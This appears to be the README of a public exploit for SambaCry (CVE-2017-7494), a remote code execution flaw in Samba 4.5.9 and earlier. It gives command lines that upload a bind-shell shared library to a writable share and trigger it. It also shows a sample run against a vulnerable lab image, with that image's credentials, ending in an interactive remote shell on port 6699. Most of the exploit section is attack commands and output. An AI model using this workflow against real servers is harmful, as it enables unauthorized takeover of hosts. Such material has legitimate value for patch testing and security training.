# SambaCry RCE exploit for Samba 4.5.9

Samba is a free software re-implementation of the SMB/CIFS networking protocol. Samba provides file and print services for various Microsoft Windows clients and can integrate with a Microsoft Windows Server domain, either as a Domain Controller (DC) or as a domain member. As of version 4, it supports Active Directory and Microsoft Windows NT domains.

Samba in **4.5.9** version and before that is vulnerable to a remote code execution vulnerability named **SambaCry**. CVE-2017-7494 allows remote authenticated users to upload a shared library to a writable shared folder, and perform code execution attacks to take control of servers that host vulnerable Samba services.

Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 does not restrict the file path when using Windows named pipes, which allows remote authenticated users to upload a shared library to a writable shared folder, and execute arbitrary code via a crafted named pipe.


## Exploit

Use `poetry` to setup the environment for this exploit

```
pip3 install -r requirements.txt
```

After that you can run it as the following:

```
./exploit -t <target> -e libbindshell-samba.so \
             -s <share> -r <location>/libbindshell-samba.so \
             -u <user> -p <password> -P 6699
```

For example, if you use the vulnerable image from `vulnerables/cve-2017-7494` and want to run this exploit against it:

```
./exploit -t <target> -e libbindshell-samba.so \
             -s data -r /data/libbindshell-samba.so \
             -u sambacry -p nosambanocry -P 6699
```

And you will get the following output

```
./exploit -t <target> -e libbindshell-samba.so \
             -s data -r /data/libbindshell-samba.so \
             -u sambacry -p nosambanocry -P 6699
[*] Starting the exploit
[+] Authentication ok, we are in !
[+] Preparing the exploit
[+] Exploit trigger running in background, checking our shell
[+] Connecting to 10.1.1.5 at 6699
[+] Veryfying your shell...
Linux 7a4b8023575a 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u1 (2017-02-22) x86_64 GNU/Linux
>>
```

# Kudos

The payload for this project, along with the code was heavily inspired by `opsxcq/exploit-CVE-2017-7494`.
